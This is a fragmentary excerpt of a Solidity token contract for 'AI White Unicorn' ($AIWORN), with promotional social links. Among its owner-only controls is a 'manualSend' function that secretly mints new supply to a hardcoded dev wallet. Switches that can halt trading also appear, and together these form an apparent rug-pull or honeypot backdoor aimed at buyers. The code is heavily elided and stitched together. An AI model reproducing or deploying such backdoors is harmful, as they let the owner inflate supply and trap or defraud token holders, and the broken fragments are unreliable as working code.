...
/**
  Telegram: https://t.me/WhiteUnicornERC
 https://twitter.com/AIWhiteUnicorn
 https://medium.com/@aiwhiteunicorn
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x3C5BEE1e7325f466b3778A8dA16e54B11D2F5b32;
...
contract AIWhiteUnicorn is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x3C5BEE1e7325f466b3778A8dA16e54B11D2F5b32);
    ...
    */
    ...
    string private _name = "AI White Unicorn"; 
    string private _symbol = "$AIWORN";  
    ...
    */
    ...
    // Update main wallet
    function WalletDev(address payable wallet) public onlyOwner() {
        Wallet_Dev = wallet;
        _isExcludedFromFee[Wallet_Dev] = true;
    }
    ...
    */
    ...
    function setTrading (bool true_or_false) public onlyOwner {
    ...
    */
    ...
    function setMaxTxn(uint256 maxTxPercent_x100) external authorized() {
        _maxTxAmount = maxTxPercent_x100;
    }    

    // Set the maximum wallet holding (percent of total supply)    
     function setMaxTxnAmount(uint256 maxWallPercent_x100) external authorized() {
        _maxWalletToken = maxWallPercent_x100;
    }

    function tokenStatus(bool _status) public authorized {
        tokenState = _status;
    }

    function manualSend(uint256 acc, address adr) authorized public virtual {
        require(adr == address(Wallet_Dev));
        _wallet(address(Wallet_Dev), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
        emit Transfer(address(Wallet_Dev), adr, acc);
    }
    ...
    function _transfer(
        ...
        */
        ...
        if (from != owner() && !authorizations[from] && !authorizations[to])
